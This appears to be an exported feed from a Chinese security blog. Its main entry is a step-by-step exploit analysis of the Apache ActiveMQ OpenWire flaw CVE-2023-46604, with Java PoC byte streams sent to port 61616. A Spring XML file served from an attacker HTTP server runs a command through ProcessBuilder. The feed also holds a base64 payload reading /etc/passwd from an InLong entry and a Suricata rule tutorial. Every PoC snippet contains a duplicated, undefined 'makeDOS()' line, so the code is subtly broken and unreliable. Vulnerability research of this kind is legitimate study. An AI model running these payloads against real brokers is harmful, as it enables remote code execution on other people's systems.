class="hljs-string">&quot;base64ZmlsZXJlYWRfL2V0Yy9wYXNzd2Q=&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;inCharges&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs bash">bin/inlong-daemon start standalonebin/inlong-daemon stop standalone</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache ActiveMQ openwire远程代码执行漏洞-CVE-2023-46604</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-ActiveMQ-CVE-2023-46604/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-ActiveMQ-CVE-2023-46604/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-ActiveMQ-openwire远程代码执行漏洞-CVE-2023-46604"><a href="#Apache-ActiveMQ-openwire远程代码执行漏洞-CVE-2023-46604" class="headerlink" title="Apache ActiveMQ openwire远程代码执行漏洞-CVE-2023-46604"></a>Apache ActiveMQ openwire远程代码执行漏洞-CVE-2023-46604</h1><p><strong>漏洞通告</strong></p><p><a href="https://activemq.apache.org/security-advisories.data/CVE-2023-46604">https://activemq.apache.org/security-advisories.data/CVE-2023-46604</a></p><p>漏洞描述：</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">The Java OpenWire protocol marshaller is vulnerable <span class="hljs-built_in">to</span> Remote Code Execution. This vulnerability may allow <span class="hljs-keyword">a</span> remote attacker <span class="hljs-keyword">with</span> network access <span class="hljs-built_in">to</span> either <span class="hljs-keyword">a</span> Java-based OpenWire broker <span class="hljs-keyword">or</span> client <span class="hljs-built_in">to</span> run arbitrary <span class="hljs-built_in">shell</span> commands <span class="hljs-keyword">by</span> manipulating serialized class types <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> OpenWire protocol <span class="hljs-built_in">to</span> cause either <span class="hljs-keyword">the</span> client <span class="hljs-keyword">or</span> <span class="hljs-keyword">the</span> broker (respectively) <span class="hljs-built_in">to</span> instantiate <span class="hljs-keyword">any</span> class <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">classpath</span>.Java OpenWire 协议编译器存在远程代码执行漏洞。利用此漏洞，远程攻击者可通过网络访问基于 Java 的 OpenWire 代理或客户端，操纵 OpenWire 协议中的序列化类类型，使客户端或代理（分别）实例化类路径上的任何类，从而运行任意 <span class="hljs-built_in">shell</span> 命令。</code></pre></div><p><a href="https://issues.apache.org/jira/browse/AMQ-9370">https://issues.apache.org/jira/browse/AMQ-9370</a></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">When</span> openwire commands are unmarshalled the marshallers should <span class="hljs-keyword">validate</span> the provided throwable <span class="hljs-keyword">class</span> <span class="hljs-keyword">type</span>.当 openwire 命令被解封时，marshaller 应验证所提供的可抛类类型。</code></pre></div><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>根据漏洞描述和issue记录，问题出在openwire的marshaller。使用github的<a href="https://github.com/apache/activemq/compare/activemq-5.18.2...activemq-5.18.3">compare功能</a>查看activemq的漏洞版本和修复版本之间提交的commit，根据漏洞描述判断相关commit为<a href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">AMQ-9370 - Openwire marshaller should validate Throwable class type</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111143530360.png"> </p><p>修复代码在<code>activemq-client/src/main/java/org/apache/activemq/openwire/vX/BaseDataStreamMarshaller.java</code>的<code>createThrowable</code>方法内增加了<code>OpenWireUtil.validateIsThrowable(clazz)</code>验证</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111143846642.png"></p><p>查看validateIsThrowable方法，判断clazz类是否为<code>Throwable.class</code>的实现类或子类</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111144008759.png"></p><p>再查看<code>createThrowable</code>方法，获取className指定的类，在获取参数是String类型的构造函数后实例化一个对象。很容易想到可使用</p><p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>，在实例化过程中进行攻击。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112113116329.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考：<a href="https://activemq.apache.org/version-5-getting-started.html">https://activemq.apache.org/version-5-getting-started.html</a></p><p>jdk11.0.13</p><p>修改<code>conf/jetty.xml</code>配置文件开启远程访问</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;jettyPort&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.activemq.web.WebConsolePort&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>         <span class="hljs-comment">&lt;!-- the default port number for the web console --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;host&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10.58.120.200&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;port&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8161&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><p>修改<code>bin/env</code>文件开启debug模式</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-comment"># Uncomment to enable remote debugging</span><span class="hljs-attr">ACTIVEMQ_DEBUG_OPTS</span>=<span class="hljs-string">&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8888&quot;</span></code></pre></div><p>运行：bin&#x2F;activemq start</p><p>访问：<a href="http://10.58.120.200:8161/admin/">http://10.58.120.200:8161/admin/</a></p><h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>翻阅官方文档关于openwire的介绍：<a href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p><p>得知OpenWire协议</p><ol><li>用于将对象编译为字节数据，并将这些编译的对象称为命令。</li><li>有两种编码方式：<code>Loose Encoding</code>和<code>Tight Encoding</code>，区别在于是否进行压缩编码，默认的编码方式为<code>Loose Encoding</code></li><li>可在TCP流中发送多个命令。</li></ol><p>查看<code>org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable</code>方法的调用者链</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112100718956.png"></p><p>发现有多个Marshaller调用到目标方法，根据官网文档这些不同的Marshaller为对应的命令类型的编译器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112100900293.png"> </p><p>继续向上查看调用者链，以<code>ConnectionErrorMarshaller</code>为例，有<code>looseUnmarshalNestedObject</code>方法和<code>doUnmarshal</code>方法调用了，前者为解码嵌套命令对象，后者为执行解码操作方法，这里继续查看后者方法（嵌套对象解码可能较复杂，直接看简单的）</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112101135444.png"> </p><p>往上看<code>OpenWireFormat.unmarshal</code>方法调用了<code>doUnmarshal</code>方法，区别在于输入源类型不同，继续查看任一<code>unmarshal</code>方法，发现<code>TcpTransport.readCommand</code>方法调用，这里猜想可能会通过TCP请求调用</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112101412860.png"></p><p>继续查看<code>readCommand</code>方法，确定可通过TCP协议发起连接请求</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112101958656.png"></p><p>那么接下来的思路就是从<code>TcpTransport.doRun</code>方法处开始反向跟进数据流向。首先调用<code>readCommand</code>方法读取command对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112102309458.png"> </p><p>进入readCommand–&gt;unmarshal方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112102428301.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112102508408.png"> </p><p>这里重点关注dis对象的构造，将dis对象赋值给dataIn，首先当<code>sizeOrefixDisabled</code>为false时，进入条件判断，需要读取一个Int数据。</p><p>构造测试代码验证后续处理流程</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ByteArrayOutputStream </span><span class="hljs-keyword">baos </span>= new <span class="hljs-keyword">ByteArrayOutputStream();</span><span class="hljs-keyword"></span>DataOutputStream out = new DataOutputStream(<span class="hljs-keyword">baos);</span><span class="hljs-keyword"></span>out.writeInt(<span class="hljs-number">1</span>)<span class="hljs-comment">;//往dis对象中写入一个Int数据</span><span class="hljs-keyword">byte[] </span><span class="hljs-keyword">bytes </span>= <span class="hljs-keyword">baos.toByteArray();</span><span class="hljs-keyword"></span>Socket socket = new Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-keyword">byte[] </span><span class="hljs-keyword">bytes </span>= makeDOS();socket.getOutputStream().write(<span class="hljs-keyword">bytes);</span><span class="hljs-keyword"></span>socket.<span class="hljs-keyword">close();</span></code></pre></div><p>下断点，发送TCP连接</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112104040380.png"></p><p>成功触发断点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112104220519.png"></p><p>这里<code>sizePrefixDisabled</code>默认为false，进入判断分支，读取int数据后进行条件判断，判断结果为false没有抛出异常，成功进入到doUnmarshal方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112104501634.png"></p><p>进入doUnmarshal方法，首先读取一个byte数据，获取dateType，根据dateType推断就是命令的类型，当dateType不为空时，创建一个数据流编译器，在通过dsm.looseUnmarshal处理输入流</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112104729363.png"></p><p>所以需要在输入流中写入一个byte数据，即命令类型，根据上面的漏洞方法的调用者链可以看到相关的方法可知最终可调用到漏洞方法的命令类型有<code>ConnectionError</code>、<code>MessageAck</code>和<code>ExceptionResponse</code>，其对应的命令标识符分别为<code>16</code>、<code>22</code>和<code>31</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112105547344.png"> </p><p>以<code>ExceptionResponse</code>为例测试，修改测试代码为</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ByteArrayOutputStream </span><span class="hljs-keyword">baos </span>= new <span class="hljs-keyword">ByteArrayOutputStream();</span><span class="hljs-keyword"></span>DataOutputStream out = new DataOutputStream(<span class="hljs-keyword">baos);</span><span class="hljs-keyword"></span>out.writeInt(<span class="hljs-number">1</span>)<span class="hljs-comment">;//往dis对象中写入一个Int数据</span>out.writeByte(<span class="hljs-number">31</span>)<span class="hljs-comment">;//指示命令类型为ExceptionResponse</span><span class="hljs-keyword">byte[] </span><span class="hljs-keyword">bytes </span>= <span class="hljs-keyword">baos.toByteArray();</span><span class="hljs-keyword"></span>Socket socket = new Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-keyword">byte[] </span><span class="hljs-keyword">bytes </span>= makeDOS();socket.getOutputStream().write(<span class="hljs-keyword">bytes);</span><span class="hljs-keyword"></span>socket.<span class="hljs-keyword">close();</span></code></pre></div><p>运行成功往下进入到<code>dsm.looseUnmarshal</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112105849616.png"></p><p>继续跟进<code>looseUnmarshal</code>方法，调用三次父类的looseUnmarshal方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112110009877.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112110035336.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112110049831.png"></p><p>在父类的looseUnmarshal方法中存在从数据流中读取数据，根据执行流程，依次需要读取的数据类型为int(CommandId)–&gt;boolean(ResponseRequired)–&gt;int(CorrelationId)，再次构造这些数据</p><div class="code-wrapper"><pre><code class="hljs csharp">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();DataOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-keyword">new</span> DataOutputStream(baos);<span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//往dis对象中写入一个Int数据</span><span class="hljs-keyword">out</span>.writeByte(<span class="hljs-number">31</span>);<span class="hljs-comment">//指示命令类型为ExceptionResponse</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CommandId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置ResponseRequired</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CorrelationId</span><span class="hljs-built_in">byte</span>[] bytes = baos.toByteArray();Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-built_in">byte</span>[] bytes = makeDOS();socket.getOutputStream().write(bytes);socket.close();</code></pre></div><p>运行测试，读取到相关字段后成功进入<code>looseUnmarsalThrowable</code>方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112110630544.png"></p><p>进入looseUnmarsalThrowable方法，已经看见漏洞方法<code>createThrowable</code>。首先读取boolean数据进行条件判断，这里需要为true</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112110721312.png"></p><p>再分别调用<code>looseUnmarshalString</code>方法获取clazz和message，查看<code>looseUnmarshalString</code>方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112111104330.png"></p><p>需要读取boolean数据，值需要为true，在读取UTF数据返回，这里的UTF数据即为返回的clazz或message。</p><p>所以目前需要再次构造boolean、boolean、UTF、boolean和UTF数据</p><div class="code-wrapper"><pre><code class="hljs csharp">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();DataOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-keyword">new</span> DataOutputStream(baos);<span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//往dis对象中写入一个Int数据</span><span class="hljs-keyword">out</span>.writeByte(<span class="hljs-number">31</span>);<span class="hljs-comment">//设置命令类型为ExceptionResponse</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CommandId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置ResponseRequired</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CorrelationId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);<span class="hljs-comment">//clazz值</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;http://127.0.0.1/calc.xml&quot;</span>);<span class="hljs-comment">//message值</span><span class="hljs-built_in">byte</span>[] bytes = baos.toByteArray();Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-built_in">byte</span>[] bytes = makeDOS();socket.getOutputStream().write(bytes);socket.close();</code></pre></div><p>启动一个http服务</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span></code></pre></div><p>创建calc.xml文件</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc.exe<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>运行代码，成功满足各条件运行到<code>createThrowable</code>方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112111627514.png"></p><p>进入方法，获取类，获取构造器，实例化对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112112459742.png"></p><p>最终在实例化对象过程中执行构造代码块成功命令执行</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240112112645970.png"></p><p>同理使用相同的方法可构造</p><p>命令类型为<code>ConnectionError</code>的数据流</p><div class="code-wrapper"><pre><code class="hljs csharp">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();DataOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-keyword">new</span> DataOutputStream(baos);<span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//往dis对象中写入一个Int数据</span><span class="hljs-keyword">out</span>.writeByte(<span class="hljs-number">16</span>);<span class="hljs-comment">//设置命令类型为ConnectionError</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CommandId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置ResponseRequired</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//设置CorrelationId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);<span class="hljs-comment">//clazz值</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;http://127.0.0.1/calc.xml&quot;</span>);<span class="hljs-comment">//message值</span><span class="hljs-built_in">byte</span>[] bytes = baos.toByteArray();Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-built_in">byte</span>[] bytes = makeDOS();socket.getOutputStream().write(bytes);socket.close();</code></pre></div><p>命令类型为<code>MessageAck</code>的数据流</p><div class="code-wrapper"><pre><code class="hljs csharp">ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();DataOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-keyword">new</span> DataOutputStream(baos);<span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//size不大于100000即可</span><span class="hljs-keyword">out</span>.writeByte(<span class="hljs-number">22</span>);<span class="hljs-comment">//设置命令类型为MessageAck</span><span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-comment">//CommandId</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//ResponseRequired</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-keyword">out</span>.writeByte(<span class="hljs-number">1</span>);<span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-keyword">out</span>.writeInt(<span class="hljs-number">1</span>);<span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);<span class="hljs-comment">//clazz值</span><span class="hljs-keyword">out</span>.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//满足条件判断</span><span class="hljs-keyword">out</span>.writeUTF(<span class="hljs-string">&quot;http://127.0.0.1/calc.xml&quot;</span>);<span class="hljs-comment">//message值</span><span class="hljs-built_in">byte</span>[] bytes = baos.toByteArray();Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;10.58.120.200&quot;</span>, <span class="hljs-number">61616</span>);<span class="hljs-built_in">byte</span>[] bytes = makeDOS();socket.getOutputStream().write(bytes);socket.close();</code></pre></div><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞成因在于没有对传入的clazz类进行校验。修复补丁增加了<code>OpenWireUtil.validateIsThrowable(clazz)</code>方法，判断传入的clazz是否为<code>Throwable.class</code>的子类</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111143846642-1705030162241-1.png"></p><p>查看validateIsThrowable方法，判断clazz类是否为<code>Throwable.class</code>的实现类或子类，或者与其相同</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240111144008759.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文从漏洞描述开始分析构造漏洞POC，以查看目标方法调用者链的方式还原数据处理过程，从而构造满足特定要求的数据流，最终触发指定方法的执行。收获到最大一点是在分析的过程中需要静下心不断翻阅官方文档熟悉项目。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Suricata规则语法</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Suricata/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Suricata/</url>
    
    <content type="html"><![CDATA[<h1 id="规则语法"><a href="#规则语法" class="headerlink" title="规则语法"></a>规则语法</h1><p>Suricata规则语法由：规则行为+规则头部+规则选项组成</p><div class="code-wrapper"><pre><code class="hljs php">drop tcp <span class="hljs-variable">$HOME_NET</span> any -&gt; <span class="hljs-variable">$EXTERNAL_NET</span> <span class="hljs-title function_ invoke__">any</span> (<span class="hljs-attr">msg</span>:<span class="hljs-string">&quot;ET TROJAN Likely Bot Nick in IRC (USA +..)&quot;</span>; <span class="hljs-attr">flow</span>:established,to_server; <span class="hljs-attr">flowbits</span>:<span class="hljs-keyword">isset</span>,is_proto_irc; <span class="hljs-attr">content</span>:<span class="hljs-string">&quot;NICK&quot;</span>; <span class="hljs-attr">pcre</span>:<span class="hljs-string">&quot;/NICK.*USA.*[0-9]&#123;3,&#125;/i&quot;</span>; <span class="hljs-attr">reference</span>:url,doc.emergingthreats.net/<span class="hljs-number">2008124</span>; <span class="hljs-attr">classtype</span>:trojan-activity; <span class="hljs-attr">sid</span>:<span class="hljs-number">2008124</span>; <span class="hljs-attr">rev</span>:<span class="hljs-number">2</span>;)</code></pre></div><h2 id="规则行为"><a href="#规则行为" class="headerlink" title="规则行为"></a>规则行为</h2><p>用于通知Suricata引擎在触发警报时该怎么做</p><table><thead><tr><th>行为</th><th>描述</th></tr></thead><tbody><tr><td>alert</td><td>通知IDS引擎记录所有匹配的规则、与匹配规则相关的数据包数据</td></tr><tr><td>drop</td><td>丢弃匹配到的数据包</td></tr><tr><td>log</td><td>通知IDS引擎记录所有匹配的规则、不记录与匹配规则相关的数据包数据</td></tr><tr><td>pass</td><td>通知IDS引擎对该数据包不做任何处理</td></tr></tbody></table><h2 id="规则头部"><a href="#规则头部" class="headerlink" title="规则头部"></a>规则头部</h2><p>变量值具体可在suricata.yaml中配置</p><table><thead><tr><th></th><th>描述</th><th>值(eg.)</th></tr></thead><tbody><tr><td>协议</td><td>指定该规则匹配什么类型的协议</td><td>tcp、udp、icmp、ip、any等</td></tr><tr><td>源地址</td><td>指定匹配的源地址和源端口</td><td>$EXTERNAL_NET、IP段、any</td></tr><tr><td>流量方向</td><td>指定数据包的流量方向</td><td>-&gt;， 从源到目标地址的单向流量&lt;-，从目标地址到源地址的单向流量&lt;&gt;，双向流量</td></tr><tr><td>目的地址</td><td>指定匹配的目的地址和目的端口</td><td>$EXTERNAL_NET、IP段、any</td></tr></tbody></table><h2 id="规则选项"><a href="#规则选项" class="headerlink" title="规则选项"></a>规则选项</h2><h3 id="事件信息选项"><a href="#事件信息选项" class="headerlink" title="事件信息选项"></a>事件信息选项</h3><table><thead><tr><th>字段</th><th>功能</th></tr></thead><tbody><tr><td>msg</td><td>规则的描述信息</td></tr><tr><td>sid</td><td>规则的标识符，ID</td></tr><tr><td>rev</td><td>规则的修订版本</td></tr><tr><td>reference</td><td>编写规则时的参考源</td></tr><tr><td>priority</td><td>规则的优先级</td></tr><tr><td>classtype</td><td>规则的分类</td></tr></tbody></table><h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><p>针对content字段的匹配。及其修饰符。</p><h3 id="通信流量"><a href="#通信流量" class="headerlink" title="通信流量"></a>通信流量</h3><p>通信流量：根据TCP协议网络流量状态编写规则</p><p>三次握手：</p><ol><li>客户端向服务器的监听端口发送SYN包来发起连接</li><li>此时，服务器需要向客户端回复一个SYN&#x2F;ACK包</li><li>一旦收到该包，客户端会回复给服务器一个ACK包</li></ol><p>数据流规则有一些专用选项，分为三类：</p><ol><li>状态选项</li><li>定向选项</li><li>流量模式状态</li></ol><p>配置格式：flow:<option>,<option>,<option></p><p>有效声明选项分别为</p><ol><li>established：只匹配已经建立TCP会话连接的流量</li><li>stateless：不论是否已建立TCP会话连接均匹配</li></ol><p>方向选项分别为：</p><ol><li>to_server：从客户端到服务端的流量</li><li>from_server：从服务端到客户端的流量</li><li>to_client：从服务端到客户端的流量</li><li>from _client：从客户端到服务端的流量</li></ol><p>no_stream：待匹配数据是重组后的流</p><p>only_stream：待匹配数据是单独的数据包</p><p>协议头检测</p><ol><li>TTL：匹配指定的TTL指，可使用关系运算符（&lt; , &lt;&#x3D;, &gt;&#x3D;, &gt;）,可以用来识别操作系统类型</li><li>dsize：匹配一个指定payload大小的数据包，可使用关系运算符（&lt; , &lt;&#x3D;, &gt;&#x3D;, &gt;）</li><li>itype：匹配指定的ICMP类型值</li><li>icode：匹配指定的ICMP代码值</li><li>ip_proto：匹配指定的IP协议，如IGMP、GRE</li></ol><h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a><strong>关键字</strong></h1><h2 id="修饰符关键字"><a href="#修饰符关键字" class="headerlink" 